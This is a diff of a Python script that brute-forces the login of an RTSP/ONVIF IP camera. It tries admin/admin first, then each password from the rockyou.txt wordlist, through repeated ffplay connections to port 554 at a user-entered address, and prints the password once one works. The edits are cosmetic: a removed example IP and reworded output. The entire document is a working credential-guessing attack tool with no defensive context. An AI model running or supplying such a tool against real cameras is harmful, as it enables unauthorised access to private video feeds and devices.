@@ -2,7 +2,7 @@ import subprocess
 
 username = 'admin'
 password = 'admin'
-ip_addr = input("Insert ip Address: ") #'192.168.188.77'
+ip_addr = input("Insert ip Address: ")
 
 res = subprocess.Popen(['ffplay',f'rtsp://{username}:{password}@{ip_addr}:554/onvif1'],stdout=subprocess.PIPE,stderr=subprocess.PIPE);
 output, error = res.communicate() 
@@ -11,7 +11,7 @@ if b"400 Bad Request" in error:
     print("Something Went Wrong, Trying Next Password...\n")
     res.kill()    
 else:
-    print(f"Nice Job, the password was {password}")
+    print(f"Nice Job, the password is {password}")
 
 # Number of lines in the WordList file (in this case, rockyou.txt).
 lines = 14344393 
@@ -27,7 +27,7 @@ with open('rockyou.txt') as topo_file:
             print("Something Went Wrong, Trying Next Password...\n")
             res.kill()    
         else:
-            print(f"Nice Job, the password was {password}")
+            print(f"Nice Job, the password is {password}")
             break
     else:
         print("\nOperation Compleated")
